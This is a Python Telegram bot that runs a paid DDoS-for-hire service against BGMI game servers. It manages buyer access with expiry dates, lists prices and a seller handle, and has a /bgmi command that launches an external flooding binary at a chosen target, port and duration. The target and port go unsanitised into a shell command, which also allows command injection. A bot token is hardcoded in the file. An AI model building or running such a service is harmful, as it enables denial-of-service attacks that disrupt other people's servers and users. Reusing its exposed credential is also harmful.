# bgmiddoserpython - Zeta Edition 🛸

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()

# Telegram bot token
bot = telebot.TeleBot('8211269146:AAFT7iEE-_BRJhZLUtggqydA3ZzPOHuAMq0')

# Admin user IDs - Only Alpha (6465928598)
admin_id = ["6465928598"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# List to store allowed user IDs
allowed_user_ids = []

# Dictionary for approval expiry
user_approval_expiry = {}

# Cooldown tracking
bgmi_cooldown = {}
COOLDOWN_TIME = 0

# Function to read user IDs from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Load users on startup
allowed_user_ids = read_users()

# Function to log command
def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(int(user_id))
        if user_info.username:
            username = "@" + user_info.username
        else:
            username = f"UserID: {user_id}"
    except:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Approval expiry functions
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    return "N/A"

def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit in ("hour", "hours"):
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ("day", "days"):
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ("week", "weeks"):
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ("month", "months"):
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False
    user_approval_expiry[user_id] = expiry_date
    return True

# ------------------- COMMAND HANDLERS -------------------

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]
            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                bot.reply_to(message, "Invalid duration format. Use like: 1hour, 2days, 3weeks, 4months")
                return
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    bot.reply_to(message, f"User {user_to_add} added for {duration} {time_unit}. Expires: {user_approval_expiry[user_to_add]}")
                else:
                    bot.reply_to(message, "Failed to set expiry.")
            else:
                bot.reply_to(message, "User already exists.")
        else:
            bot.reply_to(message, "Usage: /add <userid> <duration> (e.g., /add 123456789 1day)")
    else:
        bot.reply_to(message, "Only Alpha (Admin) can use this command.")

@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    try:
        user_info = bot.get_chat(int(user_id))
        username = user_info.username if user_info.username else "N/A"
    except:
        username = "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n🆔 ID: {user_id}\n📝 Username: {username}\n🔖 Role: {user_role}\n⏳ Remaining Time: {remaining_time}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                bot.reply_to(message, f"User {user_to_remove} removed.")
            else:
                bot.reply_to(message, "User not found.")
        else:
            bot.reply_to(message, "Usage: /remove <userid>")
    else:
        bot.reply_to(message, "Alpha only.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "w") as file:
                file.truncate(0)
            bot.reply_to(message, "Logs cleared ✅")
        except:
            bot.reply_to(message, "No logs to clear.")
    else:
        bot.reply_to(message, "Alpha only.")

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "w") as file:
                file.truncate(0)
            allowed_user_ids.clear()
            bot.reply_to(message, "All users cleared ✅")
        except:
            bot.reply_to(message, "Error clearing users.")
    else:
        bot.reply_to(message, "Alpha only.")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if allowed_user_ids:
            response = "📜 Authorized Users:\n"
            for uid in allowed_user_ids:
                response += f"- {uid}\n"
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, "No users found.")
    else:
        bot.reply_to(message, "Alpha only.")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "No logs found.")
    else:
        bot.reply_to(message, "Alpha only.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 600:
                bot.reply_to(message, "Error: Time must be < 600 seconds.")
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                bot.reply_to(message, f"🔥 ATTACK STARTED\nTarget: {target}\nPort: {port}\nTime: {time}s")
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                bot.reply_to(message, f"✅ Attack finished on {target}:{port}")
        else:
            bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "🚫 Unauthorized. Buy access from Alpha.")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.readlines()
                user_logs = [log for log in logs if f"UserID: {user_id}" in log]
                if user_logs:
                    bot.reply_to(message, "Your logs:\n" + "".join(user_logs[-10:]))
                else:
                    bot.reply_to(message, "No logs found.")
        except:
            bot.reply_to(message, "No logs found.")
    else:
        bot.reply_to(message, "Unauthorized.")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = """🤖 Zeta Bot Commands:
💥 /bgmi <target> <port> <time> - Start attack
💥 /mylogs - Your recent attacks
💥 /myinfo - Your account info
💥 /rules - Show rules

Admin Commands:
💥 /add <userid> <duration>
💥 /remove <userid>
💥 /allusers
💥 /logs
💥 /clearlogs
💥 /clearusers

Buy: @MR_UGESH"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, "❄️ Welcome to Zeta DDoS Bot. Type /help")

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    bot.reply_to(message, "Rules: No spamming attacks. Follow Zeta law. Alpha is supreme.")

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    bot.reply_to(message, "VIP Plan: 300s attack, 10s cooldown. Prices: Day 150 Rs, Week 400 Rs, Month 1000 Rs")

@bot.message_handler(commands=['admincmd'])
def admin_cmd(message):
    if str(message.chat.id) in admin_id:
        bot.reply_to(message, "/add, /remove, /allusers, /logs, /clearlogs, /clearusers, /broadcast")
    else:
        bot.reply_to(message, "Alpha only.")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            msg = "⚠️ Admin Broadcast:\n\n" + command[1]
            for uid in allowed_user_ids:
                try:
                    bot.send_message(uid, msg)
                except:
                    pass
            bot.reply_to(message, "Broadcast sent.")
        else:
            bot.reply_to(message, "Provide a message.")
    else:
        bot.reply_to(message, "Alpha only.")

# ------------------- MAIN - NO CONFLICT -------------------
if __name__ == "__main__":
    print("🔥 Zeta Bot is running. Alpha commands ready.")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
